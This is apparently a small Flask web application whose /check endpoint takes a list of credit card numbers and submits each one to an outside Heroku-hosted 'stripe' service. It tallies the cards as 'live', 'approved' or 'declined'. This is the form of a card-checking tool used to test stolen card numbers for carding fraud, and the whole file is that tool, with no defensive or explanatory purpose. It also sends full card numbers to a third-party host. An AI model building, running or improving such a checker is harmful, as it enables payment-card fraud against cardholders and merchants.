from flask import Flask, request, jsonify, render_template
import requests
import time

app = Flask(__name__)

API_URL = "https://lit-beach-04359-37fde60e4db4.herokuapp.com/stripe?cc={card}"

@app.route("/")
def home():
    return render_template("index.html")

@app.route("/check", methods=["POST"])
def check_cards():
    data = request.get_json()
    cards = data.get("cards", [])
    threads = int(data.get("threads", 1))

    results = []
    live = approved = declined = 0

    for card in cards:
        card = card.strip()
        if not card:
            continue

        start = time.time()
        try:
            r = requests.get(API_URL.format(card=card), timeout=20)
            res = r.json()
            elapsed = int((time.time() - start) * 1000)

            success = bool(res.get("success"))
            response_msg = res.get("Response", "NO RESPONSE")

            if success:
                live += 1
                approved += 1
            else:
                declined += 1

            results.append({
                "card": card,
                "success": success,
                "response": response_msg,
                "time": elapsed
            })

        except Exception as e:
            declined += 1
            results.append({
                "card": card,
                "success": False,
                "response": "ERROR",
                "time": 0
            })

    return jsonify({
        "live": live,
        "approved": approved,
        "declined": declined,
        "results": results
    })

# لا app.run() في Heroku
